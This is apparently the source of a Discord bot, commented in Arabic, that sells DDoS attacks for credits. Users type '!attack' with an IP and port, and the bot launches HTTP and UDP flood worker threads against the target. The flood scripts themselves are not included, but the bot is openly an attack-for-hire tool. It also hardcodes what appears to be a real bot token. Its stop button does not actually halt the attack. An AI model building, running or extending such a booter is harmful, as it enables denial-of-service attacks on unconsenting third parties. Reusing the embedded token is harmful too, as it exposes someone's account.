const { Client, GatewayIntentBits, EmbedBuilder, ActionRowBuilder, ButtonBuilder, ButtonStyle } = require('discord.js');
const axios = require('axios');
const http = require('http');
const { Worker } = require('worker_threads');

// ✅ تأكد من استبدال هذا بالتوكن الخاص بك
const TOKEN = "MTUzNjE3NTgyMTAyOTM3NjEwMQ.GNFrIC.-CSDTGG0Pba408qG4PdqZSJRAgweloYd8jmBSA"; 

// أو يمكنك استخدام المتغير البيئي إذا كنت تضعه في Render
// const TOKEN = process.env.TOKEN;

const client = new Client({
    intents: [
        GatewayIntentBits.Guilds,
        GatewayIntentBits.GuildMessages,
        GatewayIntentBits.MessageContent
    ]
});

// قاعدة بيانات النقاط في الذاكرة
let userCredits = {}; 

// ==================== المحرك القوي (The Beast Engine) ====================

function startBeastAttack(targetIp, port, durationSeconds = 30) {
    console.log(`🚀 BEAST MODE: Attacking ${targetIp}:${port || '80'}...`);
    
    // تشغيل خوارزميتين (Threads) للضرب المزدوج
    try {
        // 1. HTTP Flood Attack
        const httpWorker = new Worker('./http-flood.js');
        httpWorker.postMessage({ target: targetIp, port: port || 80 });

        // 2. UDP Flood Attack
        const udpWorker = new Worker('./udp-flood.js');
        udpWorker.postMessage({ target: targetIp, port: port || 80 });
        
    } catch (e) {
        console.error("Error starting threads:", e);
    }

    // إيقاف الهجوم تلقائياً بعد الوقت المحدد
    setTimeout(() => {
        console.log("🛑 Beast Attack Ended.");
    }, durationSeconds * 1000);
}

// ==================== أحداث الديسكورد ====================

client.on('ready', () => {
    console.log(`✅ Beast Bot is ready: ${client.user.tag}`);
    client.user.setActivity('Beast DDoS', { type: 'PLAYING' });
});

client.on('messageCreate', async (message) => {
    if (!message.content.startsWith('!') || message.author.bot) return;

    const args = message.content.slice(1).trim().split(/ +/);
    const command = args.shift().toLowerCase();

    // 1. أمر التذاكر (إضافة نقاط)
    if (command === 'ticket' || command === 'add') {
        const userId = args[0];
        const days = parseInt(args[1]);
        
        if (!userId || isNaN(days)) {
            const embed = new EmbedBuilder().setColor('#FF0000').setTitle('❌ خطأ').setDescription('الاستخدام: `!ticket @user 5`');
            return message.reply({ embeds: [embed] });
        }

        if (!userCredits[userId]) userCredits[userId] = 0;
        userCredits[userId] += days;

        const embed = new EmbedBuilder()
            .setColor('#00FF00')
            .setTitle('✅ تم الإضافة')
            .setDescription(`تم إضافة **${days} أيام** لـ <@${userId}>\nالرصيد الحالي: **${userCredits[userId]}**`);
        
        message.reply({ embeds: [embed] });
    }

    // 2. أمر الهجوم (Beast Mode)
    if (command === 'attack' || command === 'ddos' || command === 'crash') {
        const targetIp = args[0];
        const targetPort = parseInt(args[1]) || 80;
        const attackerUserId = message.author.id;

        if (!userCredits[attackerUserId] || userCredits[attackerUserId] <= 0) {
            const embed = new EmbedBuilder().setColor('#FF0000').setTitle('🚫 رصيدك انتهى').setDescription('الرصيد: 0');
            return message.reply({ embeds: [embed] });
        }

        userCredits[attackerUserId]--;

        const startEmbed = new EmbedBuilder()
            .setColor('#FFA500')
            .setTitle('🦁 BEAST MODE')
            .setDescription(`**الهدف:** ${targetIp}:${targetPort}\n**القوة:** 10 Threads (UDP + HTTP)\n**الحالة:** جاري التدمير...`)
            .addFields({ name: 'المدة', value: '30 ثانية' });

        const row = new ActionRowBuilder().addComponents(
            new ButtonBuilder().setCustomId('stop_beast').setLabel('إيقاف الفزع 🛑').setStyle(ButtonStyle.Danger)
        );

        const sentMsg = await message.reply({ embeds: [startEmbed], components: [row] });

        // بدء الهجوم
        startBeastAttack(targetIp, targetPort);

        // جمع الأحداث للإيقاف
        const collector = sentMsg.createMessageComponentCollector({ time: 35000 });
        collector.on('collect', async (i) => {
            if (i.customId === 'stop_beast') {
                await i.update({ 
                    embeds: [new EmbedBuilder().setColor('#FF0000').setTitle('🛑 تم إيقاف الفزع').setDescription(`الرصيد المتبقي: ${userCredits[attackerUserId]}`)], 
                    components: [] 
                });
            }
        });
    }
});

client.login(TOKEN);